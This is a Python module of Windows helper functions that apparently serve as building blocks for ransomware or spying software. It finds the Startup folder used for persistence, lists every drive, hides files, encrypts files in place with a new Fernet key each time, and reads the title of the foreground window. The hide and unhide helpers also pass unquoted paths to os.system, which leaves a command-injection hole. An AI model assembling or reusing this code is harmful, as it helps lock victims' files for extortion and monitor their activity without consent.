import os
import string
import ctypes
from ctypes import windll
from cryptography.fernet import Fernet


def get_start_up_directory_path():
    return "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

def get_parent_path(path):
    switch = False
    new_path = ""
    for char in reversed(path):
        if char == '\\':
            switch = True
        if switch:
            new_path += char
    return new_path[::-1]

def get_drives():
    drives = []
    bit_mask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bit_mask & 1:
            drives.append(letter + ":")
        bit_mask >>= 1
    return drives

def hide_file(path):
    os.system("attrib +h " + path)

def un_hide_file(path):
    os.system("attrib -h " + path)

def encrypt_file(path):
    with open(path, "rb")as file:
        token = file.read()
    key = Fernet.generate_key()
    method = Fernet(key)
    token = method.encrypt(token)
    with open(path, "wb")as file:
        file.write(token)
    return key

def decrypt_file(path, key):
    method = Fernet(key)
    with open(path, "rb")as file:
        token = file.read()
    token = method.decrypt(token)
    with open(path, "wb")as file:
        file.write(token)
    return 1

def get_current_windows():
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()  # Get handle to foreground window
    length = GetWindowTextLength(hwnd)  # Get length of the window text in title bar, passing the handle as argument
    buff = ctypes.create_unicode_buffer(length + 1)  # Create buffer to store the window title string

    GetWindowText(hwnd, buff, length + 1)  # Get window title and store in buff

    return buff.value  # Return the value of buff



print(get_current_windows())
















